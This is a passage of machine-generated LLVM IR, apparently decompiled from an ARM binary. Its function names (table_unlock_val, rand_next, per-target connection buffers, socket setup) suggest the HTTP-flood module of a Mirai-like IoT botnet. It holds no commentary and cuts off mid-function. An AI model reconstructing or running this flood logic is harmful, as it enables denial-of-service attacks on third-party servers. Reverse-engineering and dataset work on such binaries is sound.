  store i32 %v0_82fc, i32* %r0.global-to-local, align 4
  %v1_8300 = inttoptr i32 %v0_82fc to i8*
  %v2_8300 = call i32 @util_strlen(i8* %v1_8300)
  store i32 %v2_8300, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8308 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8308, i32* %ip.global-to-local, align 4
  %v3_830c = icmp uge i32 %v2_8300, %v3_8308
  store i1 %v3_830c, i1* %cpsr_c.global-to-local, align 1
  %v9_830c = icmp eq i32 %v2_8300, %v3_8308
  store i1 %v9_830c, i1* %cpsr_z.global-to-local, align 1
  %v7_8310 = icmp sgt i32 %v2_8300, %v3_8308
  br i1 %v7_8310, label %dec_label_pc_8314, label %dec_label_pc_8340

dec_label_pc_8314:                                ; preds = %dec_label_pc_82fc
  %v0_8314 = load i32, i32* @sb, align 4
  %v2_8314 = add i32 %v0_8314, %v3_8308
  %v3_8314 = inttoptr i32 %v2_8314 to i8*
  %v4_8314 = load i8, i8* %v3_8314, align 1
  %v6_8314 = zext i8 %v4_8314 to i32
  %v1_8318 = add nsw i32 %v6_8314, -32
  store i32 %v1_8318, i32* %r2.global-to-local, align 4
  %v1_831c = add nsw i32 %v6_8314, -97
  store i32 %v1_831c, i32* %r3.global-to-local, align 4
  %v2_8320 = icmp ugt i32 %v1_831c, 24
  store i1 %v2_8320, i1* %cpsr_c.global-to-local, align 1
  %v7_8320 = icmp eq i32 %v1_831c, 25
  store i1 %v7_8320, i1* %cpsr_z.global-to-local, align 1
  %v2_8324 = xor i1 %v2_8320, true
  %v3_8324 = or i1 %v7_8320, %v2_8324
  br i1 %v3_8324, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_8314
  %v5_8324 = trunc i32 %v1_8318 to i8
  store i8 %v5_8324, i8* %v3_8314, align 1
  %v0_8328.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_8328.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb172

bb172:                                            ; preds = %dec_label_pc_8314, %bb171
  %v1_832c = phi i1 [ %v2_8320, %dec_label_pc_8314 ], [ %v1_8328.pre, %bb171 ]
  %v0_832c = phi i1 [ false, %dec_label_pc_8314 ], [ %v0_8328.pre, %bb171 ]
  %v2_8328 = xor i1 %v1_832c, true
  %v3_8328 = or i1 %v0_832c, %v2_8328
  br i1 %v3_8328, label %bb173, label %._crit_edge

._crit_edge:                                      ; preds = %bb172
  %v0_8334.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb174

bb173:                                            ; preds = %bb172
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v7_832c = load i32, i32* %v11_82f4, align 4
  store i32 %v7_832c, i32* %ip.global-to-local, align 4
  br label %bb174

bb174:                                            ; preds = %._crit_edge, %bb173
  %v0_8334 = phi i32 [ %v0_8334.pre, %._crit_edge ], [ %v7_832c, %bb173 ]
  store i32 %v10_82f0, i32* @lr, align 4
  %v1_8334 = add i32 %v0_8334, 1
  store i32 %v1_8334, i32* %ip.global-to-local, align 4
  store i32 %v1_8334, i32* %stack_var_-44, align 4
  br label %dec_label_pc_82fc

dec_label_pc_8340:                                ; preds = %dec_label_pc_82fc
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_8344 = call i32 @table_unlock_val(i32 36)
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_834c = call i32 @table_unlock_val(i32 37)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_8354 = call i32 @table_unlock_val(i32 38)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_835c = call i32 @table_unlock_val(i32 39)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_8364 = call i32 @table_unlock_val(i32 40)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_836c = call i32 @table_unlock_val(i32 41)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_8374 = call i32 @table_unlock_val(i32 42)
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_837c = call i32 @table_unlock_val(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_8384 = call i32 @table_unlock_val(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_838c = call i32 @table_unlock_val(i32 45)
  store i32 %v1_838c, i32* %r0.global-to-local, align 4
  %v0_8390 = load i32, i32* @r6, align 4
  %v3_8390 = icmp ugt i32 %v0_8390, 255
  store i1 %v3_8390, i1* %cpsr_c.global-to-local, align 1
  %v8_8390 = icmp eq i32 %v0_8390, 256
  store i1 %v8_8390, i1* %cpsr_z.global-to-local, align 1
  %v5_8394 = icmp slt i32 %v0_8390, 256
  br i1 %v5_8394, label %thread-pre-split, label %bb175

bb175:                                            ; preds = %dec_label_pc_8340
  store i32 256, i32* @r6, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_8340, %bb175
  %v0_839c = phi i32 [ 256, %bb175 ], [ %v0_8390, %dec_label_pc_8340 ]
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_83a0 = call i32 @table_unlock_val(i32 46)
  store i32 %v0_839c, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_83b0 = call i32 @calloc(i32 %v0_839c, i32 3140)
  store i32 %v2_83b0, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_83b8 = icmp eq i32 %v0_839c, 0
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  %tmp176 = icmp slt i32 %v0_839c, 1
  br i1 %tmp176, label %dec_label_pc_84fc, label %dec_label_pc_83c4

dec_label_pc_83c4:                                ; preds = %thread-pre-split
  store i32 %v2_83b0, i32* @r5, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_83cc

dec_label_pc_83cc:                                ; preds = %dec_label_pc_9e44, %dec_label_pc_83c4
  %v1_83d8 = phi i32 [ %v1_9e60, %dec_label_pc_9e44 ], [ %v2_83b0, %dec_label_pc_83c4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_83d8 = inttoptr i32 %v1_83d8 to i32*
  store i32 -1, i32* %v2_83d8, align 4
  %v0_83dc = load i32, i32* %r3.global-to-local, align 4
  %v1_83dc = trunc i32 %v0_83dc to i8
  %v2_83dc = load i32, i32* @r5, align 4
  %v3_83dc = add i32 %v2_83dc, 4
  %v4_83dc = inttoptr i32 %v3_83dc to i8*
  store i8 %v1_83dc, i8* %v4_83dc, align 1
  %v0_83e0 = load i32, i32* %fp.global-to-local, align 4
  %v1_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_83e4 = udiv i32 %v0_83e0, %v1_83e4
  %v3_83e4 = urem i32 %v0_83e0, %v1_83e4
  store i32 %v2_83e4, i32* %r0.global-to-local, align 4
  store i32 %v3_83e4, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v2_83f0 = and i32 %v3_83e4, 536870912
  %v3_83f0 = icmp ne i32 %v2_83f0, 0
  store i1 %v3_83f0, i1* %cpsr_c.global-to-local, align 1
  %v5_83f0 = mul i32 %v3_83e4, 24
  store i32 %v5_83f0, i32* %r3.global-to-local, align 4
  %v2_83f4 = add i32 %v5_83f0, %arg2
  store i32 %v2_83f4, i32* @r6, align 4
  %v1_83f8 = add i32 %v2_83f4, 16
  %v2_83f8 = inttoptr i32 %v1_83f8 to i32*
  %v3_83f8 = load i32, i32* %v2_83f8, align 4
  store i32 %v3_83f8, i32* %r2.global-to-local, align 4
  %v0_83fc = load i32, i32* @r5, align 4
  %v1_83fc = add i32 %v0_83fc, 532
  store i32 %v1_83fc, i32* @lr, align 4
  store i32 %v1_83fc, i32* @r0, align 4
  %v0_8404 = load i32, i32* @r8, align 4
  store i32 %v0_8404, i32* %r1.global-to-local, align 4
  %v2_8408 = add i32 %v0_83fc, 16
  %v3_8408 = inttoptr i32 %v2_8408 to i32*
  store i32 %v3_83f8, i32* %v3_8408, align 4
  %v0_840c = load i32, i32* @lr, align 4
  %v2_8410 = inttoptr i32 %v1_83fc to i8*
  %v3_8410 = call i32 @util_strcpy(i8* %v2_8410, i32 %v0_8404)
  store i32 %v3_8410, i32* %r0.global-to-local, align 4
  %v0_8414 = load i32, i32* @r5, align 4
  %v1_8414 = add i32 %v0_8414, 532
  %v2_8414 = inttoptr i32 %v1_8414 to i8*
  %v3_8414 = load i8, i8* %v2_8414, align 1
  %v4_8414 = zext i8 %v3_8414 to i32
  store i32 %v4_8414, i32* %r3.global-to-local, align 4
  %v2_8418 = icmp ugt i8 %v3_8414, 46
  store i1 %v2_8418, i1* %cpsr_c.global-to-local, align 1
  %v7_8418 = icmp eq i8 %v3_8414, 47
  store i1 %v7_8418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8418, label %dec_label_pc_8444, label %dec_label_pc_8420

dec_label_pc_8420:                                ; preds = %dec_label_pc_83cc
  store i32 %v0_840c, i32* %r0.global-to-local, align 4
  %v1_8424 = inttoptr i32 %v0_840c to i8*
  %v2_8424 = call i32 @util_strlen(i8* %v1_8424)
  store i32 %v2_8424, i32* @r2, align 4
  %v0_842c = load i32, i32* @r5, align 4
  %v1_8430 = add i32 %v0_842c, 533
  store i32 %v1_8430, i32* @r0, align 4
  store i32 %v0_840c, i32* @r1, align 4
  %v3_8438 = call i32 @memmove(i32 %v1_8430, i32 %v0_840c, i32 %v2_8424)
  store i32 %v3_8438, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_8440 = load i32, i32* @r5, align 4
  %v3_8440 = add i32 %v2_8440, 532
  %v4_8440 = inttoptr i32 %v3_8440 to i8*
  store i8 47, i8* %v4_8440, align 1
  %v0_8448.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8444

dec_label_pc_8444:                                ; preds = %dec_label_pc_83cc, %dec_label_pc_8420
  %v0_8448 = phi i32 [ %v0_8414, %dec_label_pc_83cc ], [ %v0_8448.pre, %dec_label_pc_8420 ]
  %v0_8444 = load i32, i32* @sb, align 4
  store i32 %v0_8444, i32* %r1.global-to-local, align 4
  %v1_8448 = add i32 %v0_8448, 1440
  store i32 %v1_8448, i32* @r0, align 4
  %v2_844c = inttoptr i32 %v1_8448 to i8*
  %v3_844c = call i32 @util_strcpy(i8* %v2_844c, i32 %v0_8444)
  %v0_8450 = load i32, i32* @r5, align 4
  %v0_8454 = load i32, i32* @sb, align 4
  store i32 %v0_8454, i32* %r1.global-to-local, align 4
  %v1_8458 = add i32 %v0_8450, 1431
  store i32 %v1_8458, i32* @r0, align 4
  %v2_845c = inttoptr i32 %v1_8458 to i8*
  %v3_845c = call i32 @util_strcpy(i8* %v2_845c, i32 %v0_8454)
  %v0_8460 = load i32, i32* @r5, align 4
  %v1_8464 = add i32 %v0_8460, 789
  store i32 %v1_8464, i32* @r0, align 4
  %v0_8468 = load i32, i32* @sl, align 4
  store i32 %v0_8468, i32* %r1.global-to-local, align 4
  %v2_846c = inttoptr i32 %v1_8464 to i8*
  %v3_846c = call i32 @util_strcpy(i8* %v2_846c, i32 %v0_8468)
  store i32 %v3_846c, i32* %r0.global-to-local, align 4
  %v0_8470 = load i32, i32* @r6, align 4
  %v1_8470 = add i32 %v0_8470, 20
  %v2_8470 = inttoptr i32 %v1_8470 to i8*
  %v3_8470 = load i8, i8* %v2_8470, align 1
  %v4_8470 = zext i8 %v3_8470 to i32
  store i32 %v4_8470, i32* %r3.global-to-local, align 4
  %v2_8474 = icmp ugt i8 %v3_8470, 30
  store i1 %v2_8474, i1* %cpsr_c.global-to-local, align 1
  %v7_8474 = icmp eq i8 %v3_8470, 31
  store i1 %v7_8474, i1* %cpsr_z.global-to-local, align 1
  %v2_8478 = xor i1 %v7_8474, true
  %v3_8478 = and i1 %v2_8474, %v2_8478
  br i1 %v3_8478, label %dec_label_pc_84c0, label %dec_label_pc_847c

dec_label_pc_847c:                                ; preds = %dec_label_pc_8444
  %v1_847c = add i32 %v0_8470, 16
  %v2_847c = inttoptr i32 %v1_847c to i32*
  %v3_847c = load i32, i32* %v2_847c, align 4
  store i32 %v3_847c, i32* @r4, align 4
  %v0_8480 = call i32 @rand_next()
  store i32 %v0_8480, i32* %r0.global-to-local, align 4
  %v0_8484 = load i32, i32* @r4, align 4
  %v1_8484 = and i32 %v0_8484, 16711680
  store i32 %v1_8484, i32* %r1.global-to-local, align 4
  %v3_8488 = udiv i32 %v0_8484, 16777216
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_848c = udiv i32 %v1_8484, 256
  %v5_848c = or i32 %v4_848c, %v3_8488
  store i32 %v5_848c, i32* %r2.global-to-local, align 4
  %v1_8490 = and i32 %v0_8484, 65280
  store i32 %v1_8490, i32* %r3.global-to-local, align 4
  %v0_8494 = load i32, i32* @r6, align 4
  %v1_8494 = add i32 %v0_8494, 20
  %v2_8494 = inttoptr i32 %v1_8494 to i8*
  %v3_8494 = load i8, i8* %v2_8494, align 1
  %v4_8494 = zext i8 %v3_8494 to i32
  %v5_849c = call i32 @llvm.bswap.i32(i32 %v0_8484)
  %v7_84a0 = lshr i32 %v0_8480, %v4_8494
  %v8_84a0 = add i32 %v7_84a0, %v5_849c
  store i32 %v8_84a0, i32* %r2.global-to-local, align 4
  %v1_84a4 = and i32 %v8_84a0, 16711680
  store i32 %v1_84a4, i32* %r0.global-to-local, align 4
  %v1_84b0 = and i32 %v8_84a0, 65280
  store i32 %v1_84b0, i32* %r1.global-to-local, align 4
  %v2_84b8 = and i32 %v8_84a0, 256
  %v3_84b8 = icmp ne i32 %v2_84b8, 0
  store i1 %v3_84b8, i1* %cpsr_c.global-to-local, align 1
  %v5_84b8 = call i32 @llvm.bswap.i32(i32 %v8_84a0)
  store i32 %v5_84b8, i32* %r3.global-to-local, align 4
  %v1_84bc = load i32, i32* @r5, align 4
  %v2_84bc = add i32 %v1_84bc, 16
  %v3_84bc = inttoptr i32 %v2_84bc to i32*
  store i32 %v5_84b8, i32* %v3_84bc, align 4
  br label %dec_label_pc_84c0

dec_label_pc_84c0:                                ; preds = %dec_label_pc_8444, %dec_label_pc_847c
  %v0_84c0 = call i32 @rand_next()
  %v3_84cc = udiv i32 %v0_84c0, 5
  store i32 %v3_84cc, i32* %r2.global-to-local, align 4
  store i32 %v3_84cc, i32* %r3.global-to-local, align 4
  %v2_84d8 = sub i32 %v0_84c0, %v3_84cc
  store i32 %v2_84d8, i32* %r0.global-to-local, align 4
  %v7_84dc = icmp eq i32 %v2_84d8, 4
  store i1 %v7_84dc, i1* %cpsr_z.global-to-local, align 1
  %v5_84e0 = and i32 %v2_84d8, 1073741824
  %v6_84e0 = icmp ne i32 %v5_84e0, 0
  store i1 %v6_84e0, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v2_84d8, label %dec_label_pc_9e44 [
    i32 0, label %dec_label_pc_9f08
    i32 1, label %dec_label_pc_9edc
    i32 2, label %dec_label_pc_9f34
    i32 3, label %dec_label_pc_9e1c
    i32 4, label %dec_label_pc_9e9c
  ]

dec_label_pc_84fc:                                ; preds = %thread-pre-split
  %v0_850c = load i32, i32* @r7, align 4
  %v1_850c = and i32 %v0_850c, 128
  %v2_850c = icmp ne i32 %v1_850c, 0
  store i1 %v2_850c, i1* %cpsr_c.global-to-local, align 1
  %v3_850c = udiv i32 %v0_850c, 256
  store i32 %v3_850c, i32* %r3.global-to-local, align 4
  %v1_8510 = add i32 %v2_83b0, 1452
  store i32 %v1_8510, i32* %r1.global-to-local, align 4
  %v2_8514 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_8514, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_852c.preheader

dec_label_pc_852c.preheader:                      ; preds = %dec_label_pc_84fc, %dec_label_pc_9e68
  %v0_9e78.sink = phi i32 [ %v0_9e78, %dec_label_pc_9e68 ], [ %v0_850c, %dec_label_pc_84fc ]
  %stack_var_-20864.0.ph = phi i32 [ %v3_9e78, %dec_label_pc_9e68 ], [ %v3_850c, %dec_label_pc_84fc ]
  %stack_var_-20860.0.ph = phi i32 [ %v2_9e80, %dec_label_pc_9e68 ], [ %v2_8514, %dec_label_pc_84fc ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_9e7c, %dec_label_pc_9e68 ], [ %v1_8510, %dec_label_pc_84fc ]
  %v1_9e84 = urem i32 %v0_9e78.sink, 256
  store i32 %v1_9e84, i32* @r7, align 4
  %v2_8694 = ptrtoint i32* %stack_var_-152 to i32
  %v2_86ac = ptrtoint i32* %stack_var_-44 to i32
  %v2_86f4 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8710 = ptrtoint i32* %stack_var_-40 to i32
  %v1_88f0 = inttoptr i32 %stack_var_-20860.0.ph to i8*
  %v2_8c4c = icmp eq i32 %v6_81fc, 0
  %v1_8b48 = inttoptr i32 %v6_81fc to i8*
  %v2_8778 = ptrtoint i32* %stack_var_-60 to i32
  %v2_877c = ptrtoint i32* %stack_var_-204 to i32
  %v2_8780 = ptrtoint i32* %stack_var_-332 to i32
  %v2_8860 = ptrtoint i32* %stack_var_-48 to i32
  %v2_886c = ptrtoint i32* %stack_var_-52 to i32
  %v4_86cc = mul nuw nsw i32 %v1_9e84, 256
  %v5_86cc = or i32 %v4_86cc, %stack_var_-20864.0.ph
  br label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %dec_label_pc_8758, %dec_label_pc_858c, %dec_label_pc_8750, %dec_label_pc_87ec, %dec_label_pc_852c.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_8530 = call i32 @__GI_time(i32* null)
  store i32 %v2_8530, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_855c225 = load i32, i32* @sp, align 4
  %v3_855c226 = add i32 %v2_855c225, 20688
  %v4_855c227 = inttoptr i32 %v3_855c226 to i32*
  store i32 0, i32* %v4_855c227, align 4
  br label %dec_label_pc_8548.dec_label_pc_8548_crit_edge

dec_label_pc_8548.dec_label_pc_8548_crit_edge:    ; preds = %dec_label_pc_852c, %dec_label_pc_8548.dec_label_pc_8548_crit_edge
  %v0_8548.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_854c = add i32 %v0_8548.pre, 4
  store i32 %v1_854c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_8554 = add i32 %v0_8548.pre, 20684
  store i32 %v1_8554, i32* @lr, align 4
  %v7_8558 = icmp eq i32 %v1_854c, 128
  %v2_855c = load i32, i32* @sp, align 4
  %v3_855c = add i32 %v2_855c, %v1_8554
  %v4_855c = inttoptr i32 %v3_855c to i32*
  store i32 0, i32* %v4_855c, align 4
  br i1 %v7_8558, label %dec_label_pc_8564, label %dec_label_pc_8548.dec_label_pc_8548_crit_edge

dec_label_pc_8564:                                ; preds = %dec_label_pc_8548.dec_label_pc_8548_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v0_8568 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_8568, i32* %stack_var_-332, align 4
  %v0_856c = load i32, i32* %r3.global-to-local, align 4
  %v1_8574228 = add i32 %v0_856c, -120
  store i32 %v1_8574228, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_857c229 = add i32 %v0_856c, 20432
  store i32 %v1_857c229, i32* %r2.global-to-local, align 4
  %v7_8580230 = icmp eq i32 %v1_8574228, 128
  %v2_8584231 = load i32, i32* @sp, align 4
  %v3_8584232 = add i32 %v2_8584231, %v1_857c229
  %v4_8584233 = inttoptr i32 %v3_8584232 to i32*
  store i32 0, i32* %v4_8584233, align 4
  br i1 %v7_8580230, label %dec_label_pc_858c, label %dec_label_pc_8570.dec_label_pc_8570_crit_edge

dec_label_pc_8570.dec_label_pc_8570_crit_edge:    ; preds = %dec_label_pc_8564, %dec_label_pc_8570.dec_label_pc_8570_crit_edge
  %v0_8570.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_8574 = add i32 %v0_8570.pre, 4
  store i32 %v1_8574, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_857c = add i32 %v0_8570.pre, 20556
  store i32 %v1_857c, i32* %r2.global-to-local, align 4
  %v7_8580 = icmp eq i32 %v1_8574, 128
  %v2_8584 = load i32, i32* @sp, align 4
  %v3_8584 = add i32 %v2_8584, %v1_857c
  %v4_8584 = inttoptr i32 %v3_8584 to i32*
  store i32 0, i32* %v4_8584, align 4
  br i1 %v7_8580, label %dec_label_pc_858c, label %dec_label_pc_8570.dec_label_pc_8570_crit_edge

dec_label_pc_858c:                                ; preds = %dec_label_pc_8570.dec_label_pc_8570_crit_edge, %dec_label_pc_8564
  store i32 %v0_839c, i32* %r3.global-to-local, align 4
  %v1_8590 = load i32, i32* %r0.global-to-local, align 4
  %v3_8590 = icmp uge i32 %v0_839c, %v1_8590
  store i1 %v3_8590, i1* %cpsr_c.global-to-local, align 1
  %v9_8590 = icmp eq i32 %v0_839c, %v1_8590
  store i1 %v9_8590, i1* %cpsr_z.global-to-local, align 1
  %v7_8594 = icmp sgt i32 %v0_839c, %v1_8590
  br i1 %v7_8594, label %dec_label_pc_8598, label %dec_label_pc_852c

dec_label_pc_8598:                                ; preds = %dec_label_pc_858c
  store i32 %stack_var_-20872.0.ph, i32* @sl, align 4
  store i32 %v1_8590, i32* @r8, align 4
  store i32 %stack_var_-20872.0.ph, i32* @r6, align 4
  store i32 %v1_8590, i32* @r7, align 4
  br label %dec_label_pc_860c

dec_label_pc_85ac:                                ; preds = %dec_label_pc_8620
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_85ac = icmp eq i8 %v3_860c, 2
  store i1 %v7_85ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85ac, label %dec_label_pc_8cec, label %dec_label_pc_85b4

dec_label_pc_85b4:                                ; preds = %dec_label_pc_85ac
  %v2_85b4 = icmp ugt i8 %v3_860c, 3
  store i1 %v2_85b4, i1* %cpsr_c.global-to-local, align 1
  %v7_85b4 = icmp eq i8 %v3_860c, 4
  store i1 %v7_85b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85b4, label %dec_label_pc_88bc, label %dec_label_pc_85bc

dec_label_pc_85bc:                                ; preds = %dec_label_pc_85b4
  %v1_85bc = add nsw i32 %v4_860c, -6
  %v2_85bc = icmp ugt i8 %v3_860c, 5
  store i1 %v2_85bc, i1* %cpsr_c.global-to-local, align 1
  %v7_85bc = icmp eq i8 %v3_860c, 6
  store i1 %v7_85bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85bc, label %dec_label_pc_8d1c, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85bc
  %v2_85c4 = icmp ugt i8 %v3_860c, 6
  store i1 %v2_85c4, i1* %cpsr_c.global-to-local, align 1
  %v7_85c4 = icmp eq i8 %v3_860c, 7
  store i1 %v7_85c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85c4, label %dec_label_pc_8f58, label %dec_label_pc_85cc

dec_label_pc_85cc:                                ; preds = %dec_label_pc_85c4
  %v2_85cc = icmp ugt i8 %v3_860c, 9
  store i1 %v2_85cc, i1* %cpsr_c.global-to-local, align 1
  %v7_85cc = icmp eq i8 %v3_860c, 10
  store i1 %v7_85cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85cc, label %dec_label_pc_8fac, label %dec_label_pc_85d4

dec_label_pc_85d4:                                ; preds = %dec_label_pc_85cc
  %v1_85d4 = add nsw i32 %v4_860c, -11
  %v2_85d4 = icmp ugt i8 %v3_860c, 10
  store i1 %v2_85d4, i1* %cpsr_c.global-to-local, align 1
  %v7_85d4 = icmp eq i8 %v3_860c, 11
  store i1 %v7_85d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85d4, label %dec_label_pc_956c, label %dec_label_pc_85dc

dec_label_pc_85dc:                                ; preds = %dec_label_pc_8cec, %dec_label_pc_85d4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_860c, align 1
  %v0_85e4 = load i32, i32* @r6, align 4
  %v1_85e4 = add i32 %v0_85e4, -1452
  %v2_85e4 = inttoptr i32 %v1_85e4 to i32*
  %v3_85e4 = load i32, i32* %v2_85e4, align 4
  store i32 %v3_85e4, i32* %r0.global-to-local, align 4
  %v1_85e8 = call i32 @__GI___libc_close(i32 %v3_85e4)
  store i32 %v1_85e8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_85f0 = load i32, i32* @r6, align 4
  %v2_85f0 = add i32 %v1_85f0, -1452
  %v3_85f0 = inttoptr i32 %v2_85f0 to i32*
  store i32 -1, i32* %v3_85f0, align 4
  br label %dec_label_pc_85f4

dec_label_pc_85f4:                                ; preds = %dec_label_pc_8fac, %dec_label_pc_8f58, %dec_label_pc_8d1c, %dec_label_pc_8628, %dec_label_pc_8718, %dec_label_pc_956c, %bb180, %dec_label_pc_85dc
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_85f8 = load i32, i32* @r7, align 4
  %v1_85f8 = add i32 %v0_85f8, 1
  store i32 %v1_85f8, i32* @r7, align 4
  %v0_85fc = load i32, i32* @r6, align 4
  %v3_8600 = icmp uge i32 %v1_85f8, %v0_839c
  store i1 %v3_8600, i1* %cpsr_c.global-to-local, align 1
  %v9_8600 = icmp eq i32 %v1_85f8, %v0_839c
  store i1 %v9_8600, i1* %cpsr_z.global-to-local, align 1
  %v1_8604 = add i32 %v0_85fc, 3140
  store i32 %v1_8604, i32* @r6, align 4
  br i1 %v9_8600, label %dec_label_pc_85f4.dec_label_pc_8750_crit_edge, label %dec_label_pc_860c

dec_label_pc_85f4.dec_label_pc_8750_crit_edge:    ; preds = %dec_label_pc_85f4
  %v0_8750.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_8750

dec_label_pc_860c:                                ; preds = %dec_label_pc_8738, %dec_label_pc_85f4, %dec_label_pc_8598
  %v3_88b0 = phi i32 [ %stack_var_-20872.0.ph, %dec_label_pc_8598 ], [ %v1_8604, %dec_label_pc_85f4 ], [ %v1_8748, %dec_label_pc_8738 ]
  %v1_860c = add i32 %v3_88b0, -1448
  %v2_860c = inttoptr i32 %v1_860c to i8*
  %v3_860c = load i8, i8* %v2_860c, align 1
  %v4_860c = zext i8 %v3_860c to i32
  store i32 %v4_860c, i32* @r3, align 4
  %v2_8614 = icmp ne i8 %v3_860c, 0
  store i1 %v2_8614, i1* %cpsr_c.global-to-local, align 1
  %v6_8614 = icmp eq i8 %v3_860c, 0
  %v7_8614 = icmp eq i8 %v3_860c, 1
  store i1 %v7_8614, i1* %cpsr_z.global-to-local, align 1
  %v1_8618 = add i32 %v3_88b0, -1452
  store i32 %v1_8618, i32* @r5, align 4
  br i1 %v7_8614, label %dec_label_pc_88a4, label %dec_label_pc_8620

dec_label_pc_8620:                                ; preds = %dec_label_pc_860c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_8614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_8614, label %dec_label_pc_8628, label %dec_label_pc_85ac

dec_label_pc_8628:                                ; preds = %.thread19.dec_label_pc_8628_crit_edge, %dec_label_pc_8620
  %v0_8628 = phi i32 [ %v0_8628.pre, %.thread19.dec_label_pc_8628_crit_edge ], [ %v3_88b0, %dec_label_pc_8620 ]
  %v1_8628 = add i32 %v0_8628, -1452
  %v2_8628 = inttoptr i32 %v1_8628 to i32*
  %v3_8628 = load i32, i32* %v2_8628, align 4
  store i32 %v3_8628, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  %v2_8634 = icmp eq i32 %v3_8628, -1
  store i1 %v2_8634, i1* %cpsr_c.global-to-local, align 1
  %v7_8634 = icmp eq i32 %v3_8628, -1
  store i1 %v7_8634, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-76, align 4
  store i32 34380, i32* @lr, align 4
  %v1_8648 = xor i1 %v7_8634, true
  call void @__pseudo_cond_branch(i1 %v1_8648, i32 ptrtoint (i32* @global_var_16390.35 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_8654 = load i32, i32* @r5, align 4
  store i32 %v0_8654, i32* %r2.global-to-local, align 4
  %v3_8658 = call i32 @socket(i32 2, i32 1, i32 %v0_8654)
  store i32 %v3_8658, i32* %r0.global-to-local, align 4
  %v2_865c = icmp eq i32 %v3_8658, -1
  store i1 %v2_865c, i1* %cpsr_c.global-to-local, align 1
  %v7_865c = icmp eq i32 %v3_8658, -1
  store i1 %v7_865c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8658, i32* @r4, align 4
  %v1_8664 = load i32, i32* @r6, align 4
  %v2_8664 = add i32 %v1_8664, -1452
  %v3_8664 = inttoptr i32 %v2_8664 to i32*
  store i32 %v3_8658, i32* %v3_8664, align 4
  br i1 %v7_865c, label %dec_label_pc_85f4, label %dec_label_pc_866c

dec_label_pc_866c:                                ; preds = %dec_label_pc_8628
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_8670 = load i32, i32* @r5, align 4
  store i32 %v0_8670, i32* @r2, align 4
